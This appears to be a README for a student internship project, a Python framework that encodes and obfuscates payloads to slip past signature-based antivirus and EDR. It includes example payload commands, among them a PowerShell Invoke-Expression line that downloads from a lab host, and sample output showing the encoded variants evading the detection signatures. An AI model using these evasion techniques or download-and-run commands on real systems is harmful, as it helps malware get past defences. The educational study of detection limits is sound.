# 🔐 Custom Payload Encoder & Obfuscation Framework

![Python](https://img.shields.io/badge/Python-3.x-blue)
![Internship](https://img.shields.io/badge/Internship-Unified%20Mentor-orange)
![Domain](https://img.shields.io/badge/Domain-Cybersecurity-red)
![Status](https://img.shields.io/badge/Status-Completed-green)

## 📌 About The Project

A Python-based educational security research tool developed during my 
cybersecurity internship at **Unified Mentor**.

This framework demonstrates how offensive payloads are encoded and 
obfuscated to evade signature-based detection systems like Antivirus, 
EDR, IPS, and Firewalls — strictly in a controlled lab environment.

---

## 🚀 Features

- ✅ **Base64 Encoding & Decoding**
- ✅ **XOR Encryption** (user-defined key)
- ✅ **ROT13 Substitution Cipher**
- ✅ **Layered Encoding** (XOR → Base64 → ROT13)
- ✅ **6 String Obfuscation Techniques**
- ✅ **Simulated Signature-Based Detection Engine**
- ✅ **JSON Report Generation**
- ✅ **CLI Interface**

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| Python 3 | Core programming language |
| base64 | Encoding module |
| argparse | CLI interface |
| json | Report generation |
| random | Obfuscation techniques |
| datetime | Report timestamping |

---

## 📂 Project Structure


---

## ⚙️ How To Run

```bash
# Step 1 - Clone the repo
git clone https://github.com/ghost101-sec/payload-obfuscation-framework

# Step 2 - Go into the folder
cd payload-obfuscation-framework

# Step 3 - Run the framework
python payload_framework.py
```

---

## 💻 Usage Examples

```bash
# Default demo run
python payload_framework.py

# Custom payload
python payload_framework.py -p "cmd.exe /c whoami"

# Custom payload + XOR key
python payload_framework.py -p "cmd.exe /c whoami" -k 77

# Save JSON report
python payload_framework.py -p "eval(os.system('id'))" -o report.json

# Verify decoding
python payload_framework.py -p "test payload" --verify
```

---

## 📊 Sample Output

=================================================================
PAYLOAD ENCODER & OBFUSCATION FRAMEWORK — REPORT

Timestamp : 2026-11-04T10:00:00
XOR Key : 42
Original : powershell -c “Invoke-Expression(wget http://lab/test)”

EVASION TEST RESULTS

original DETECTED ✗ [3 sig(s): powershell, wget, invoke-expression]
base64 BYPASSED ✓
xor BYPASSED ✓
rot13 BYPASSED ✓
layered BYPASSED ✓
hex_escape BYPASSED ✓
unicode_escape BYPASSED ✓

Bypass rate: 9/11 variants evaded detection


---

## 🎓 Learning Outcomes

- How payloads are encoded to evade detection
- How signature-based detection works and its limitations
- Python OOP — classes, static methods, modules
- CLI tool development with argparse
- JSON report generation

---

## ⚠️ Disclaimer

> This project is built **strictly for educational purposes** 
> in a **controlled lab environment** as part of a cybersecurity internship.  
> No real systems were targeted. All payloads are test strings only.

---

## 🏢 Internship Details

| Field | Details |
|-------|---------|
| Organization | Unified Mentor |
| Domain | Cybersecurity |
| Project | Custom Payload Encoder & Obfuscation Framework |
| Language | Python 3 |


